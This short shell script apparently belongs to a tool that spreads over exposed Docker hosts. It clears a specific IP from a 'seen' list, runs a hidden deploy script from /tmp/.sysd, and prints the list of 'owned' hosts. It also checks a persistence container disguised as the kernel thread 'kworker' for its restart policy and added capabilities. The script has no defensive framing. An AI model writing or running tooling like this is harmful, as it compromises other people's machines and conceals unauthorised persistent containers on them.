#!/bin/sh
# throwaway: confirm version label + owned dedupe after the fixes
W=/tmp/.sysd/.hunt
grep -v '^167\.233\.74\.146$' "$W/dock.seen" > /tmp/s.3; mv -f /tmp/s.3 "$W/dock.seen"
sh /tmp/.sysd/dock.sh 2>&1 | grep -E 'queue|daemon|already|DEPLOYED|scanned'
echo "owned lines now: $(wc -l < "$W/dock.owned")"
cat "$W/dock.owned"
docker inspect -f 'restart={{.HostConfig.RestartPolicy.Name}} caps={{.HostConfig.CapAdd}} ipc={{.HostConfig.IpcMode}}' kworker 2>&1
docker ps --format '{{.Names}} {{.Status}}' 2>&1
